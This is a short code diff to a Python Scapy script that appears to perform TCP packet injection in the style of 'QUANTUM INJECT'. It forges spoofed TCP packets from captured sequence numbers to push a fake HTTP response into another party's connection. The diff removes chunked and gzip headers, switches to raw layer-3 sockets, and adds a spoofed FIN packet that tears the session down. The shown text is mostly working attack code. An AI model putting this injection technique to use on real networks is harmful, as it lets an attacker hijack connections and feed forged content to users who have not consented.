@@ -27,13 +27,13 @@ REGEX_SYNACK = re.compile(
 
 
 PAYLOAD_PUTTY_BODY = 'hehehehhahahah\r\n'
-PAYLOAD_PUTTY_HEADER = 'HTTP/1.1 200 OK\r\nServer: nginx\r\nDate: Mon, 03 May 2021 18:16:19 GMT\r\nContent-Type: text/html\r\nLast-Modified: Wed, 14 Apr 2021 14:47:45 GMT\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\nETag: W/"60770091-208"\r\nContent-Encoding: gzip\r\n\r\n'
+PAYLOAD_PUTTY_HEADER = 'HTTP/1.1 200 OK\r\nServer: nginx\r\nDate: Mon, 03 May 2021 18:16:19 GMT\r\nContent-Type: text/html\r\nLast-Modified: Wed, 14 Apr 2021 14:47:45 GMT\r\nConnection: keep-alive\r\nETag: W/"60770091-208"\r\n\r\n'
 PAYLOAD_PUTTY = PAYLOAD_PUTTY_HEADER + PAYLOAD_PUTTY_BODY
 
 
 def main():
     print('Ready to QUANTUM INJECT HAHAHA')
-
+    conf.L3socket=L3RawSocket
     while True:
         line = sys.stdin.readline()
         print("LOG: ", line.strip())
@@ -44,8 +44,9 @@ def main():
                                        seq=int(seq)+1, ack=int(ack), flags="PA") / payload
         send(p)
         print('Sending: %r' % p)
-        sendp(p, iface="eth0")
-        print('Sending to eth0: %r' % p)
+        p = IP(src=src, dst=dst) / TCP(sport=int(sport), dport=int(dport), seq=int(seq)+len(payload)+1, ack=int(ack), flags="FA")
+        send(p)
+        print('Sending: %r' % p)
 
 
 if __name__ == '__main__':
